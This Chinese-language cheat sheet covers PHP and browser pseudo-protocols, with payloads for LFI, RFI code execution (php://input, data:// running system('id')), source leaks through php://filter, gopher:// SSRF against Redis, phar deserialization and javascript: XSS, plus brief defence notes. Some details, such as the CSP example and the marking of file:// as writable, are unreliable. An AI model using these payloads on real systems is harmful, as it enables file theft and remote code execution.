## 伪协议(Pseudo-Protocol)汇总

伪协议（Pseudo-Protocol）是指在 **浏览器** 或 **特定程序中** 使用的一种**非标准 URL 协议**，用于**触发特殊操作**（如执行 JavaScript、打开系统应用、调用客户端软件）。

---

| 协议         | 读   | 写   | 包含执行 | 典型利用场景       |
| ------------ | ---- | ---- | -------- | ------------------ |
| php://input  | ✓    | ✗    | ✓        | 代码执行、数据捕获 |
| php://filter | ✓    | ✗    | ✗        | 文件读取、编码绕过 |
| data://      | ✓    | ✗    | ✓        | 直接代码执行       |
| phar://      | ✓    | ✗    | ✓        | 反序列化攻击       |
| file://      | ✓    | ✓    | ✓        | 本地文件读取       |
| zip://       | ✓    | ✗    | ✗        | 压缩包内文件访问   |

### **1. `file://` —— 读取本地文件**

**用途**：访问本地文件系统。
**示例**：

```url
file:///etc/passwd           # 读取 Linux 密码文件
file:///C:/Windows/win.ini   # 读取 Windows 文件
```

**攻击场景**：

- **文件包含漏洞（LFI）**：

  ```php
  include($_GET['file']);   // 传入 ?file=file:///etc/passwd
  ```

- **XXE（XML 外部实体注入）**：

  ```xml
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
  ```

**防御**：

- 过滤 `file://` 协议
- 禁用外部实体（`libxml_disable_entity_loader(true)`）

---

### **2. `php://` —— PHP 伪协议**

PHP 提供多种伪协议用于读取/写入数据流。

##### **(1) `php://filter` —— 文件读取与编码**

**用途**：读取文件内容并进行 Base64 等编码。
**示例**：

```url
php://filter/convert.base64-encode/resource=/etc/passwd
```

**攻击场景**：

- **读取 PHP 源文件**（绕过 `include` 执行）：

  ```php
  include($_GET['file']);   // ?file=php://filter/convert.base64-encode/resource=config.php
  ```

- **绕过 `<?php exit; ?>` 拦截**（利用 Base64 处理）：

  ```php
  php://filter/convert.base64-decode/resource=data:text/plain,PD9waHAgcGhwaW5mbygpOyA/Pg==
  ```

##### **(2) `php://input` —— 直接执行代码**

**用途**：读取 POST 输入流，可执行任意 PHP 代码。
**示例**：

```http
POST /vuln.php?file=php://input HTTP/1.1
...
<?php system("id"); ?>
```

**适用场景**：

- **RFI（远程文件包含）+ 伪协议 RCE**：

  ```php
  include($_GET['file']);   // ?file=php://input
  ```

**防御**：

- 关闭 `allow_url_include`（默认关闭）
- 验证输入协议

---

### **3. `data://` —— 数据流封装（Base64 执行 PHP）**

**用途**：直接嵌入 Base64/PHP 代码。
**示例**：

```url
data://text/plain,<?php system("id"); ?>
data://text/plain;base64,PD9waHAgc3lzdGVtKCJpZCIpOyA/Pg==
```

**攻击场景**：

- **RFI + `data://` 直接执行代码**：

  ```php
  include($_GET['file']);  // ?file=data://text/plain,<?php system("whoami"); ?>
  ```

- **绕过 `<?php` 过滤**：

  ```php
  data://text/plain;base64,PHBocCBzeXN0ZW0oImlkIik7ID8+
  ```

**防御**：

- 禁用 `allow_url_include` & `allow_url_fopen`
- 检查 `data://` 协议

---

### **4. `expect://` —— 执行系统命令（很少支持）**

**用途**：直接调用系统命令（需 `expect` 扩展）。
**示例**：

```url
expect://id
```

**攻击场景**：

- **SSRF/代码执行**：

  ```php
  file_get_contents($_GET['url']);  // ?url=expect://ls
  ```

**防御**：

- 禁用 `expect` 扩展

---

### **5. `gopher://` —— SSRF 高级利用**

**用途**：发送 TCP/UDP 数据包（常用于 SSRF）。
**示例**：

```
gopher://127.0.0.1:6379/_*1%0d%0a$4%0d%0aping%0d%0a  # Redis 未授权访问
```

**攻击场景**：

1. **内网服务探测/攻击**：

   - 访问 `Redis`、`MySQL`、`Memcached` 等内网服务

2. **HTTP Request 转发**（模拟请求）：

   ```text
   gopher://attacker.com:80/_GET /admin HTTP/1.1%0AHost: internal-server%0A%0A
   ```

**防御**：

- 禁用 `gopher://` & 内网访问
- 使用 `url_validate` 检查请求目标

---

### **6. `zip://` 和 `phar://` —— 文件解压缩利用**

##### **(1) `zip://`**

**用途**：读取 ZIP 文件内容。
**示例**：

```
zip:///var/www/uploads/evil.zip%23shell.php
```

**攻击场景**：

- **上传恶意 ZIP + 文件包含 RCE**：

  ```php
  include($_GET['file']);  // ?file=zip://uploads/evil.zip%23shell.php
  ```

##### **(2) `phar://`（更强大）**

**用途**：执行 ZIP/JAR/TAR 内的 PHP 代码
**示例**：

```
phar:///var/www/uploads/evil.phar/shell.php
```

**攻击场景**：

- **反序列化攻击（利用 `phar` 特性）**：

  ```php
  file_exists("phar://evil.phar");  // 触发反序列化
  ```

**防御**：

- 避免 `phar://` 反序列化攻击（如 `phar.readonly=On`）
- 检查文件扩展名

---

### (补)**`7.javascript:`** 

在浏览器地址栏或 `<a href>` 中执行 JS 代码

```html
<a href="javascript:alert('XSS')">点击触发 XSS</a>
```

**XSS（跨站脚本攻击）**

伪协议 `javascript:` 可被用于恶意代码注入：

```html
<a href="javascript:alert('XSS')">点我</a>
<!-- 攻击者可构造恶意链接： -->
http://example.com#javascript:stealCookie()
```

**防御方法**：

对用户输入进行严格过滤（移除 `javascript:` 等伪协议）。

使用 **CSP（内容安全策略）** 禁止内联脚本：

```html
<meta http-equiv="Content-Security-Policy" content="default-src 'self'; script-src 'unsafe-eval'">
```



### **总结：伪协议利用方式**

| 协议              | 用途            | 典型攻击      |
| ----------------- | --------------- | ------------- |
| `file://`         | 读取本地文件    | LFI / XXE     |
| `php://filter`    | 读取/编码文件   | 源码泄露      |
| `php://input`     | 执行 PHP 代码   | RFI+代码执行  |
| `data://`         | 执行 Base64/PHP | 直接代码执行  |
| `expect://`       | 系统命令执行    | RCE           |
| `gopher://`       | TCP/UDP 请求    | SSRF 内网攻击 |
| `zip://`          | ZIP 文件读取    | 解压文件执行  |
| `phar://`         | 反序列化/执行   | 反序列化攻击  |
| (补)`javascript:` | 执行js代码      | XSS           |
| (补)`http://`     | 访问网页/IP     | 远程包含      |



